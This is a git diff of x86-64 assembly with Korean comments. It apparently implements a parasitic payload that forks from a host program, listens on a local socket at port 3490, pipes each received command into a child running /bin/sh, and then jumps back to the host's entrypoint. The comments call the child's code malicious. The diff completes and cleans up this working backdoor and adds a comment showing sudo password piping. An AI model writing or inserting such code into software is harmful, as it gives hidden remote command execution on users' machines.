@@ -2,15 +2,14 @@ BITS 64
 
 %include "inc64.inc"
 
+; echo "password" | sudo -S <command>
+
 section .data
 ; Constant
 MAXDATASIZE equ 1024
 SOCK_STREAM equ 1
 AF_INET equ 2
 
-; 현재 문제점 구조체 값 자체가 이상해 소켓 연결이 안됨
-; 파이프는 정상
-; 전체 구조체를 다시 수정하거나 원리를 깨달아야함
 ; Data Structure
 struc my_addr, -16 ; rbp - 16부터 첫번째 구조체 시작
     .sin_family:    resb 2;2bytes
@@ -26,7 +25,7 @@ struc their_addr, -32 ; rbp - 32부터 첫번째 구조체 시작
     .sin_zero:      resb 8;8bytes
 endstruc
 
-struc socket, -1072; rbp - 1052 부터 첫번째 구조체 시작 
+struc socket, -1072; rbp - 1072 부터 첫번째 구조체 시작 
     .sockfd: resb 4; 4bytes
     .newfd: resb 4; 4bytes
     .sin_size: resb 4; 4bytes
@@ -34,7 +33,7 @@ struc socket, -1072; rbp - 1052 부터 첫번째 구조체 시작
     .buf: resb MAXDATASIZE ; 1024bytes
 endstruc
 
-struc pipefd, -1080 ; rbp - 1056 부터 첫번째 구조체 시작
+struc pipefd, -1080 ; rbp - 1080 부터 첫번째 구조체 시작
     .read: resb 4; 4bytes
     .write: resb 4; 4bytes
 endstruc
@@ -51,6 +50,7 @@ recvfromErrorMessage: db "recvfrom",10,0
 setsockoptErrorMessage: db "setsockopt",10,0
 listenErrorMessage: db "listen",10,0
 acceptErrorMessage: db "accept",10,0
+writeErrorMessage: db "write",10,0
 command: db "/bin/sh",0
 reuseAddress: dd 1
 exitMessage: db "exit",0
@@ -74,19 +74,17 @@ _child:
     mov rbp, rsp
     sub rsp, 2000 ; 여유 스택 공간 확보
 
-
     call _socket
     
     mov dword [rbp + socket.sockfd], eax ; save to socket fd
 
-    call _setsockopt_reuse
+    call _setsockopt_reuse ; set socket reuse option
 
-
+    ; 
     mov word [rbp + my_addr.sin_family], AF_INET ; host byte order
     mov word [rbp + my_addr.sin_port], 0xa20d ; port 3490
     mov dword [rbp + my_addr.sin_addr], 0x100007f; 127.0.0.1
     mov qword [rbp + my_addr.sin_zero], 0
-    
     
     call _bind
 
@@ -101,7 +99,6 @@ _child:
     jmp _fork2
 
 _child_execve:
-    ;call _pipe
     ; 파이프의 쓰기 단을 닫음
     ; close($rdi) 성공하면 0
     mov edi, dword[rbp + pipefd.write] ; write
@@ -143,12 +140,13 @@ _child_execve:
     cmp rax, -1
     je _dup2Failed
 
-    ; $rdi, $rsi, $rdx
+    ;                           $rdi,               $rsi
+    ;  int execve(const char *pathname, char *const argv[],
+    ;                           $rdx
+    ;              char *const envp[]);
     lea rdi, [rel $+command-$]
     xor rsi, rsi
     xor rdx, rdx
-    ;lea rsi, [rel $+argv-$]
-    ;lea rdx, [rel $+envp-$]
     mov rax, SYS_EXECVE
     syscall
 
@@ -156,9 +154,7 @@ _child_execve:
     jmp _end
 
 
-
-_parent_socket: ; TODO : recvfrom하고, 수신한 명령어를 child process에 쓰고 accept 반복!
-    ;call _pipe
+_parent_socket: ; recvfrom하고, 수신한 명령어를 child process에 쓰기 반복
     ; 파이프의 읽기 단을 닫음
     ; close($rdi) 성공하면 0
     mov edi, dword[rbp + pipefd.read] ; pipefd.read
@@ -170,56 +166,40 @@ _parent_socket: ; TODO : recvfrom하고, 수신한 명령어를 child process에
 _loop:
     call _recvfrom
     cmp rax, 0
-    jle _loop
-
+    jle _loop ; recvfrom으로 읽은 결과가 0보다 작다면 다시 읽음(단순히 다른 오류는 고려하지 않음)
 
     mov dword[rbp + socket.numbytes], eax
     lea rdx, [rbp + socket.buf]
-    mov byte [rdx + rax], 0
+    mov byte [rdx + rax], 0 ; 끝 글자에 0 삽입
 
-    mov edi, dword[rbp + pipefd.write] ;write
-    lea rsi, [rbp + socket.buf]
-    mov edx, [rbp + socket.numbytes]
-    add edx, 1
-    mov rax, SYS_WRITE
-    syscall
-    
-    ; 입력 받은 글자가 exit인지 확인하는 루틴
-    lea rdi, [rbp + socket.buf]
-    lea rsi, [rel $+exitMessage-$]
-    mov rcx, 4 ; 4글자
-    repe cmpsb
-    jne _loop ;결과가 같지 않으면 다시 반복
-    ; 같다면 종료
+    call _write_to_child
+
+    jmp _check_exit
+
+_exit:
+    ; 종료 문자 같은 경우
     ; 소켓 닫고
     ; 파이프 닫고 종료
-    mov edi, dword[rbp + pipefd.write] ; pipefd.read
+    ; 쓰기 파이프 닫기
+    mov edi, dword[rbp + pipefd.write] ; pipefd.write
     mov rax, SYS_CLOSE
     syscall
     cmp rax, 0
     jne _closeFailed
 
-    mov edi, dword[rbp + socket.sockfd] ; 
+    ; accept socket 닫기
+    mov edi, dword[rbp + socket.sockfd]
     mov rax, SYS_CLOSE
     syscall
     cmp rax, 0
     jne _closeFailed
 
-    mov edi, dword[rbp + socket.newfd] ; 
+    ; recvfrom socket 닫기
+    mov edi, dword[rbp + socket.newfd] 
     mov rax, SYS_CLOSE
     syscall
     cmp rax, 0
     jne _closeFailed
-
-
-    
-
-    ;mov rax, 1
-    ;mov rdi, 1
-    ;lea rsi, [rel $+forkErrorMessage-$]
-    ;mov dword [rbp - sockaddr_in.sin_addr], 5
-    ;mov rdx, [rbp  - sockaddr_in.sin_addr]
-    ;syscall
 
 _end:
     ;function 에필로그
@@ -228,6 +208,7 @@ _end:
     exit
 
 _parent:
+    ; 원래 프로세스는 entrypoint로 돌아간다.
     pop r11
     pop rdi
     pop rsi
@@ -238,6 +219,7 @@ _parent:
     push 0x4049a0            ; jump to entrypoint
     ret
 
+; functions
 
 _socket:
     ; socket($rdi, $rsi, $rdx, $rcx)
@@ -317,11 +299,7 @@ _recvfrom:
     mov r9, 0
     mov rax, SYS_RECVFROM
     syscall
-    ;cmp rax, -1
-    ;jle _recvfromFailed
     ret
-
-
 
 _pipe:
     ;               $rdi
@@ -333,8 +311,29 @@ _pipe:
     jne _pipeFailed
     ret
 
+; 수신한 명령어를 child process로 쓰는 함수
+_write_to_child:
+    mov edi, dword[rbp + pipefd.write] ;pipe.write
+    lea rsi, [rbp + socket.buf]
+    mov edx, [rbp + socket.numbytes]
+    add edx, 1
+    mov rax, SYS_WRITE
+    syscall
+    cmp rax, 0
+    jle _writeFailed
+    ret
+
+; 입력 받은 글자가 exit인지 확인하는 루틴
+_check_exit:
+    lea rdi, [rbp + socket.buf]
+    lea rsi, [rel $+exitMessage-$]
+    mov rcx, 4 ; 4글자
+    repe cmpsb
+    jne _loop ; 결과가 같지 않으면 다시 반복
+    jmp _exit ; 결과가 같다면 종료
+
 _fork1:
-    ; fork해서 child process에서 악성코드 실행!
+    ; 처음 fork는 원래 프로그램으로 돌아가는 목적
     mov rax, SYS_FORK
     syscall
     cmp rax, -1
@@ -344,7 +343,7 @@ _fork1:
     jmp _child
 
 _fork2:
-    ; fork해서 child process에서 악성코드 실행!
+    ; 두번째 fork는 child process에서 악성코드 실행!
     mov rax, SYS_FORK
     syscall
     cmp rax, -1
@@ -353,7 +352,7 @@ _fork2:
     jne _parent_socket
     jmp _child_execve
 
-
+; debug Print Failed Message
 
 _forkFailed:
     mov rax, 1 ; write
@@ -380,6 +379,16 @@ _bindFailed:
     mov rdi, 1 ; stdout
     lea rsi, [rel $+bindErrorMessage-$]
     mov rdx, 5 ; len
+    syscall
+    mov rsp, rbp
+    pop rbp
+    exit
+
+_writeFailed:
+    mov rax, 1 ; write
+    mov rdi, 1 ; stdout
+    lea rsi, [rel $+writeErrorMessage-$]
+    mov rdx, 6 ; len
     syscall
     mov rsp, rbp
     pop rbp
